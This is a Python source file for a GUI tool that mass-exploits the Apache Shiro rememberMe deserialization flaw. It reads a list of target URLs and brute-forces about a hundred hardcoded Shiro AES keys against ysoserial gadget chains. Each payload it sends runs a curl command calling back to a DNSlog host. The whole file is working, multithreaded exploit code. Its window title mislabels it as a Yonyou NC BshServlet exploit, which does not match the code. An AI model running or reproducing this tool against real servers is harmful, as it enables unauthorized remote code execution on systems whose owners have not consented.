# -*- coding: utf-8 -*-
import os
import base64
import uuid
import subprocess
from Crypto.Cipher import AES
import threading
import urllib3
import re
import requests
import tkinter as tk
from tkinter import scrolledtext
from concurrent.futures import ThreadPoolExecutor
from ttkbootstrap.constants import *
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

JAR_FILE = './exp/ysoserial.jar'

ip_line_regex = re.compile(r'([0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}(\/[1-2][0-9])?)')

plugins = ['CommonsBeanutils1','CommonsCollections1','CommonsCollections2','CommonsCollections3','CommonsCollections4','CommonsCollections5','CommonsCollections6','CommonsCollections7','CommonsCollections8','CommonsCollections9','CommonsCollections10']
keys = ['kPH+bIxk5D2deZiIxcaaaA==',
'4AvVhmFLUs0KTA3Kprsdag==',
'Z3VucwAAAAAAAAAAAAAAAA==',
'fCq+/xW488hMTCD+cmJ3aQ==',
'0AvVhmFLUs0KTA3Kprsdag==',
'1AvVhdsgUs0FSA3SDFAdag==',
'1QWLxg+NYmxraMoxAXu/Iw==',
'25BsmdYwjnfcWmnhAciDDg==',
'2AvVhdsgUs0FSA3SDFAdag==',
'3AvVhmFLUs0KTA3Kprsdag==',
'3JvYhmBLUs0ETA5Kprsdag==',
'r0e3c16IdVkouZgk1TKVMg==',
'5aaC5qKm5oqA5pyvAAAAAA==',
'5AvVhmFLUs0KTA3Kprsdag==',
'6AvVhmFLUs0KTA3Kprsdag==',
'6NfXkC7YVCV5DASIrEm1Rg==',
'6ZmI6I2j5Y+R5aSn5ZOlAA==',
'cmVtZW1iZXJNZQAAAAAAAA==',
'7AvVhmFLUs0KTA3Kprsdag==',
'8AvVhmFLUs0KTA3Kprsdag==',
'8BvVhmFLUs0KTA3Kprsdag==',
'9AvVhmFLUs0KTA3Kprsdag==',
'OUHYQzxQ/W9e/UjiAGu6rg==',
'a3dvbmcAAAAAAAAAAAAAAA==',
'aU1pcmFjbGVpTWlyYWNsZQ==',
'bWljcm9zAAAAAAAAAAAAAA==',
'bWluZS1hc3NldC1rZXk6QQ==',
'bXRvbnMAAAAAAAAAAAAAAA==',
'ZUdsaGJuSmxibVI2ZHc9PQ==',
'wGiHplamyXlVB11UXWol8g==',
'U3ByaW5nQmxhZGUAAAAAAA==',
'MTIzNDU2Nzg5MGFiY2RlZg==',
'L7RioUULEFhRyxM7a2R/Yg==',
'a2VlcE9uR29pbmdBbmRGaQ==',
'WcfHGU25gNnTxTlmJMeSpw==',
'OY//C4rhfwNxCQAQCrQQ1Q==',
'5J7bIJIV0LQSN3c9LPitBQ==',
'f/SY5TIve5WWzT4aQlABJA==',
'bya2HkYo57u6fWh5theAWw==',
'WuB+y2gcHRnY2Lg9+Aqmqg==',
'kPv59vyqzj00x11LXJZTjJ2UHW48jzHN',
'3qDVdLawoIr1xFd6ietnwg==',
'ZWvohmPdUsAWT3=KpPqda',
'YI1+nBV//m7ELrIyDHm6DQ==',
'6Zm+6I2j5Y+R5aS+5ZOlAA==',
'2A2V+RFLUs+eTA3Kpr+dag==',
'6ZmI6I2j3Y+R1aSn5BOlAA==',
'SkZpbmFsQmxhZGUAAAAAAA==',
'2cVtiE83c4lIrELJwKGJUw==',
'fsHspZw/92PrS3XrPW+vxw==',
'XTx6CKLo/SdSgub+OPHSrw==',
'sHdIjUN6tzhl8xZMG3ULCQ==',
'O4pdf+7e+mZe8NyxMTPJmQ==',
'HWrBltGvEZc14h9VpMvZWw==',
'rPNqM6uKFCyaL10AK51UkQ==',
'Y1JxNSPXVwMkyvES/kJGeQ==',
'lT2UvDUmQwewm6mMoiw4Ig==',
'MPdCMZ9urzEA50JDlDYYDg==',
'xVmmoltfpb8tTceuT5R7Bw==',
'c+3hFGPjbgzGdrC+MHgoRQ==',
'ClLk69oNcA3m+s0jIMIkpg==',
'Bf7MfkNR0axGGptozrebag==',
'1tC/xrDYs8ey+sa3emtiYw==',
'ZmFsYWRvLnh5ei5zaGlybw==',
'cGhyYWNrY3RmREUhfiMkZA==',
'IduElDUpDDXE677ZkhhKnQ==',
'yeAAo1E8BOeAYfBlm4NG9Q==',
'cGljYXMAAAAAAAAAAAAAAA==',
'2itfW92XazYRi5ltW0M2yA==',
'XgGkgqGqYrix9lI6vxcrRw==',
'ertVhmFLUs0KTA3Kprsdag==',
'5AvVhmFLUS0ATA4Kprsdag==',
's0KTA3mFLUprK4AvVhsdag==',
'hBlzKg78ajaZuTE0VLzDDg==',
'9FvVhtFLUs0KnA3Kprsdyg==',
'd2ViUmVtZW1iZXJNZUtleQ==',
'yNeUgSzL/CfiWw1GALg6Ag==',
'NGk/3cQ6F5/UNPRh8LpMIg==',
'4BvVhmFLUs0KTA3Kprsdag==',
'MzVeSkYyWTI2OFVLZjRzZg==',
'CrownKey==a12d/dakdad',
'empodDEyMwAAAAAAAAAAAA==',
'A7UzJgh1+EWj5oBFi+mSgw==',
'YTM0NZomIzI2OTsmIzM0NTueYQ==',
'c2hpcm9fYmF0aXMzMgAAAA==',
'i45FVt72K2kLgvFrJtoZRw==',
'U3BAbW5nQmxhZGUAAAAAAA==',
'ZnJlc2h6Y24xMjM0NTY3OA==',
'Jt3C93kMR9D5e8QzwfsiMw==',
'MTIzNDU2NzgxMjM0NTY3OA==',
'vXP33AonIp9bFwGl7aT7rA==',
'V2hhdCBUaGUgSGVsbAAAAA==',
'Z3h6eWd4enklMjElMjElMjE=',
'Q01TX0JGTFlLRVlfMjAxOQ==',
'ZAvph3dsQs0FSL3SDFAdag==',
'Is9zJ3pzNh2cgTHB4ua3+Q==',
'NsZXjXVklWPZwOfkvk6kUA==',
'GAevYnznvgNCURavBhCr1w==',
'66v1O8keKNV3TTcGPK1wzg==',
'SDKOLKn2J1j/2BHjeZwAoQ==']



def shiro_poc(url):
    dnslog = shiro_text.get()
    target = url.strip()
    r = requests.get(target, cookies={'rememberMe': '1'}, timeout=3, verify=False, allow_redirects=False)  # 发送验证请求
    if 'deleteMe' not in r.headers['Set-Cookie']:
        shiro_text.insert(END,"【-】没有启用rememberMe--" + target + "\n")
        shiro_text.see(END)
        return False
    for plugin in plugins:
        for key in keys:
            ip = ip_line_regex.search(target).group()
            #en_ip = base64.b64encode(ip.encode('utf-8')).decode()
            en_ip = ip.replace('.','_')
            emae = ('curl http://'+ plugin + '.' + key + '.' + en_ip + '.')
            try:
                payload = generator(JAR_FILE,plugin,key,emae+dnslog)  # 生成payload
                shiro_text.insert(END, "【+】payload为：" + payload.decode() + "\n")
                shiro_text.see(END)
                r = requests.get(target, cookies={'rememberMe': payload.decode()}, timeout=2,verify=False)  # 发送验证请求
                shiro_text.insert(END, "【+】成功发送数据包--" + target + "\n")
                shiro_text.see(END)
            except:
                shiro_text.insert(END, "【-】发送数据包失败--" + target + "\n")
                shiro_text.see(END)
                break
    return False

def generator(fp,plugin,key,command):
    if not os.path.exists(fp):
        raise Exception('jar file not found!')
    popen = subprocess.Popen(['java', '-jar', fp, plugin, command],
                             stdout=subprocess.PIPE)
    BS = AES.block_size
    pad = lambda s: s + ((BS - len(s) % BS) * chr(BS - len(s) % BS)).encode()
    mode = AES.MODE_CBC
    iv = uuid.uuid4().bytes
    encryptor = AES.new(base64.b64decode(key), mode, iv)
    file_body = pad(popen.stdout.read())
    base64_ciphertext = base64.b64encode(iv + encryptor.encrypt(file_body))
    return base64_ciphertext

def get_shiro_addr():
    with open("修正后的url.txt","r") as f:
        for address in f.readlines():
            address = address.strip()
            yield address
def thread_shiro():
    addrs = get_shiro_addr()
    max_thread_num = 30
    executor = ThreadPoolExecutor(max_workers=max_thread_num)
    for addr in addrs:
        future = executor.submit(shiro_poc, addr)
def shiro_gui():
    global shiro_text
    shiroGui = tk.Tk()
    shiroGui.geometry("910x450")
    shiroGui.title("用友 NC bsh.servlet.BshServlet 远程命令执行漏洞一把梭")
    shiroGui.resizable(0, 0)
    shiroGui.iconbitmap('logo.ico')
    global shiro_text
    shiro_text = scrolledtext.ScrolledText(shiroGui,width=124, height=22)
    shiro_text.grid(row=1, column=0,columnspan=2, padx=10, pady=10)
    shiro_text.see(END)
    shiro_dnslog = tk.StringVar(shiroGui,value="填写dnslog的网址，例如xxxx.dnslog.cn或xxxx.ceye.io")
    shiro_entry = tk.Entry(shiroGui,width=95,textvariable=shiro_dnslog)
    shiro_entry.grid(row=0,column=0,padx=5,pady=5)
    shiro_button = tk.Button(shiroGui,text="开始利用",command=thread_shiro,width=20)
    shiro_button.grid(row=0,column=1,padx=5,pady=5)
    shiroGui.mainloop()